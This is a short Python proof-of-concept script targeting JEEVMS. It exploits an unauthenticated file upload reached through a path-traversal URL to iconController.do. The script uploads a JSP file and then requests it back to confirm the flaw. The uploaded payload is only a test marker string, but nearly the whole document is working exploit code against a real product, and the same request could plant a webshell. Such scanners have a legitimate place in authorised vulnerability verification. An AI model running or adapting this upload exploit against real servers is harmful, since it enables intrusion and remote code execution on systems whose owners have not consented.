#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import sys
import requests
import re
import urllib
import urllib3

urllib3.disable_warnings()

def verify(site):
    burp0_url =  site + "/api/%2e%2e/iconController.do?saveOrUpdateIcon"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.75 Safari/537.36", "Cache-Control": "max-age=0", "Connection": "close", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryW0vdr4bjEUTVj3Sw", "Accept-Encoding": "gzip"}
    burp0_data = "------WebKitFormBoundaryW0vdr4bjEUTVj3Sw\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\nvulntest.jsp\r\n------WebKitFormBoundaryW0vdr4bjEUTVj3Sw\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n\r\n------WebKitFormBoundaryW0vdr4bjEUTVj3Sw\r\nContent-Disposition: form-data; name=\"iconName\"\r\n\r\ndd\r\n------WebKitFormBoundaryW0vdr4bjEUTVj3Sw\r\nContent-Disposition: form-data; name=\"iconType\"\r\n\r\n1\r\n------WebKitFormBoundaryW0vdr4bjEUTVj3Sw\r\nContent-Disposition: form-data; name=\"file\"; filename=\"vulntest.jsp\"\r\nContent-Type: application/octet-stream\r\n\r\nvulntest123\r\n------WebKitFormBoundaryW0vdr4bjEUTVj3Sw--\r\n"
    r = requests.post(burp0_url, headers=burp0_headers, data=burp0_data, verify=False)
    result_url = site+'/plug-in/accordion/images/vulntest.jsp'
    r2 = requests.get(result_url, verify=False, timeout=15)
    if r2.status_code == 200 and 'vulntest123' in r2.text:
            return result_url
    return ""
    
if __name__=="__main__":
    target = sys.argv[1]
    print("Microsoft Winows [版本 10.0.19044.3086]\n(c) Microsoft Corporation。保留所有权利。\n\nD:\VulnSubmit\script>python3 JEEVMS-iconController-upload.py ",target)
    data = verify(target)
    if data:
        print("[+]漏洞存在，上传后的路径为：", data)
    else:
        print("[-]漏洞不存在")
